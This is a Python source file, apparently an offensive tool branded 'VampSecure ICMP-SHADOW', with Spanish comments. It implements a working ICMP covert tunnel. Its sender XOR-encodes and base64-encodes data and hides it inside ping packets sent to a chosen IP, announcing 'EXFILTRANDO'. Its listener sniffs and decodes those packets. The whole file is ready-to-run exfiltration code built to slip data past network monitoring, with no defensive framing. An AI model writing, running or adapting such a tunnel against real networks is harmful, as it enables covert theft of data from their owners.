import sys
import base64
import argparse
from datetime import datetime
from scapy.all import IP, ICMP, Raw, sniff, send

# ==========================================
# IDENTIDAD VISUAL VAMPSECURE
# ==========================================
BANNER = r"""
  __     __                      _____                            
  \ \   / /                     / ____|                           
   \ \_/ /__ _ _ __ ___  _ __ | (___   ___  ___ _   _ _ __ ___  
    \   / _` | '_ ` _ \| '_ \ \___ \ / _ \/ __| | | | '__/ _ \ 
     | | (_| | | | | | | |_) |____) |  __/ (__| |_| | | |  __/ 
     |_|\__,_|_| |_| |_| .__/|_____/ \___|\___|\__,_|_|  \___| 
                       | |                                        
                       |_|   [ICMP-SHADOW v1.1]
                               By VampSecure Intelligence
"""

# Clave de ofuscación por defecto (Cámbiala en producción)
SECRET_KEY = "VAMP_KEY_2026"

def get_timestamp():
    return datetime.now().strftime('%H:%M:%S')

def xor_cipher(data, key):
    """Aplica XOR entre los datos y la clave (repite la clave si es necesario)"""
    return bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])

def obfuscate(text, key):
    """Cifra con XOR y luego codifica en Base64 para el transporte"""
    xor_data = xor_cipher(text.encode(), key)
    return base64.b64encode(xor_data).decode()

def deobfuscate(b64_data, key):
    """Decodifica Base64 y luego aplica XOR para recuperar el texto"""
    try:
        xor_data = base64.b64decode(b64_data)
        return xor_cipher(xor_data, key).decode(errors='ignore')
    except:
        return None

# --- MÓDULO EMISOR ---
def send_data(target_ip, message, key):
    shadow_data = obfuscate(message, key)
    print(f"[{get_timestamp()}] [*] EXFILTRANDO: {message}")
    print(f"[{get_timestamp()}] [>] CARGA OFUSCADA: {shadow_data}")
    
    packet = IP(dst=target_ip)/ICMP(type=8)/Raw(load=shadow_data)
    send(packet, verbose=False)
    print(f"[{get_timestamp()}] [+] Paquete Shadow enviado.")

# --- MÓDULO RECEPTOR ---
def process_packet(pkt, key):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        if pkt.haslayer(Raw):
            intercepted_raw = pkt[Raw].load.decode(errors='ignore')
            clear_text = deobfuscate(intercepted_raw, key)
            
            if clear_text:
                src_ip = pkt[IP].src
                print(f"[{get_timestamp()}] [!] CAPTURA de {src_ip}:")
                print(f"    >> Raw (Wire): {intercepted_raw}")
                print(f"    >> Clear Text: {clear_text}")

def start_listener(interface, key):
    print(f"[{get_timestamp()}] [*] ESCUCHA SHADOW ACTIVA EN: {interface}")
    print(f"[*] USANDO CLAVE: {key}")
    print("-" * 65)
    sniff(iface=interface, filter="icmp", prn=lambda x: process_packet(x, key), store=0)

if __name__ == "__main__":
    print(BANNER)
    parser = argparse.ArgumentParser(description="VampSecure ICMP Covert Tunnel")
    parser.add_argument("-m", "--mode", choices=['send', 'listen'], required=True)
    parser.add_argument("-t", "--target", help="IP destino")
    parser.add_argument("-d", "--data", help="Mensaje secreto")
    parser.add_argument("-i", "--interface", default="eth0", help="Interfaz de red")
    parser.add_argument("-k", "--key", default=SECRET_KEY, help="Clave XOR")

    args = parser.parse_args()

    try:
        if args.mode == 'send':
            send_data(args.target, args.data, args.key)
        else:
            start_listener(args.interface, args.key)
    except KeyboardInterrupt:
        print(f"\n[*] Canal cerrado.")
